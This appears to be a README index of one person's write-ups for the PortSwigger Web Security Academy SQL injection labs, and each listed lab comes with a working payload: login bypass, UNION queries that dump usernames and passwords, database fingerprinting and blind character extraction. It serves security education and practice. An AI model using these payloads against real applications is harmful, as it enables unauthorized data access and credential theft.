# PortSwigger Web Security Academy — SQL Injection (SQLi) Write-Ups

Structured VAPT write-ups, Burp Suite workflows, exploitation proofs, and defensive remediation guides for all 18 PortSwigger Web Security Academy SQL Injection labs.

**Author:** [Yaseen Khan](https://www.linkedin.com/in/yaseenkhann8) | **Focus:** Web Application Penetration Testing & VAPT

---

## Completed Labs (`12 / 18`)

| # | Lab Title | Difficulty | Technique / Payload | Write-Up |
| :-: | :--- | :--- | :--- | :--- |
| 01 | SQL injection vulnerability in WHERE clause allowing retrieval of hidden data | Apprentice | `' OR 1=1--` | [View Write-Up](SQL-Injection/01-sqli-where-clause-hidden-data.md) |
| 02 | SQL injection vulnerability allowing login bypass | Apprentice | `administrator'--` | [View Write-Up](SQL-Injection/02-sqli-login-bypass.md) |
| 03 | SQL injection attack, querying the database type and version on Oracle | Practitioner | `' UNION SELECT banner,NULL FROM v$version--` | [View Write-Up](SQL-Injection/03-sqli-oracle-version.md) |
| 04 | SQL injection attack, querying the database type and version on MySQL and Microsoft | Practitioner | `' UNION SELECT @@version,NULL#` | [View Write-Up](SQL-Injection/04-sqli-mysql-microsoft-version.md) |
| 05 | SQL injection attack, listing the database contents on non-Oracle databases | Practitioner | `' UNION SELECT username,password FROM users--` | [View Write-Up](SQL-Injection/05-sqli-list-contents-non-oracle.md) |
| 06 | SQL injection attack, listing the database contents on Oracle | Practitioner | `' UNION SELECT username,password FROM users--` | [View Write-Up](SQL-Injection/06-sqli-list-contents-oracle.md) |
| 07 | SQL injection UNION attack, determining the number of columns returned by the query | Practitioner | `' UNION SELECT NULL,NULL,NULL--` | [View Write-Up](SQL-Injection/07-sqli-union-column-count.md) |
| 08 | SQL injection UNION attack, finding a column containing text | Practitioner | `' UNION SELECT NULL,'string',NULL--` | [View Write-Up](SQL-Injection/08-sqli-union-text-column.md) |
| 09 | SQL injection UNION attack, retrieving data from other tables | Practitioner | `' UNION SELECT username,password FROM users--` | [View Write-Up](SQL-Injection/09-sqli-union-retrieve-data.md) |
| 10 | SQL injection UNION attack, retrieving multiple values in a single column | Practitioner | `' UNION SELECT NULL,username||'~'||password FROM users--` | [View Write-Up](SQL-Injection/10-sqli-union-multiple-values-single-column.md) |
| 11 | Blind SQL injection with conditional responses | Practitioner | `' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--` | [View Write-Up](SQL-Injection/11-sqli-blind-conditional-responses.md) |
| 12 | Blind SQL injection with conditional errors | Practitioner | `'||(SELECT CASE WHEN SUBSTR(password,1,1)='3' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` | [View Write-Up](SQL-Injection/12-sqli-blind-conditional-errors.md) |
